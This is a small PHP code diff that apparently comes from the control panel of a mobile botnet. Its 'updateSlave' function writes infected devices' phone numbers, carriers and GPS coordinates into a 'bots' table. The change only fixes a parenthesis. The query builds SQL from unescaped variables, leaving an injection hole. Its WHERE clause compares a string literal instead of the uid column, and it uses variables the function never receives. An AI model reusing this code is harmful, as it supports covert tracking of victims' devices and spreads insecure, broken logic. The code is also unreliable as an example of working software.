@@ -67,7 +67,7 @@ function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNum
   global $connect;
   
   if (slave_exists($UID)){
-	$statement = ("UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE 'uid' = '$UID'";
+	$statement ="UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE 'uid' = '$UID'";
 	$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
 
 
